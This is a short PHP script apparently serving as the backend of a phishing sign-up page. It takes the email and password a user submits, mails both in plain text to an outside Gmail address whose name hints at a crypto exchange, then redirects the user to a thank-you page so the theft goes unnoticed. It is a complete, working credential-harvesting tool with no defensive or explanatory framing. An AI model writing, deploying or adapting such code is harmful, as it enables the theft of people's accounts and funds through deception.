<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $to = "buzzigabinance22@gmail.com"; 
    $subject = "New Sign-up";
    
    $email = $_POST["email"];
    $password = $_POST["password"];

    $message = "New sign-up details:\n\n";
    $message .= "Email: $email\n";
    $message .= "Password: $password\n";

    mail($to, $subject, $message);

    // redirect the user to a thank-you page
    header("Location:thank-you.html");
    exit();
}
?>
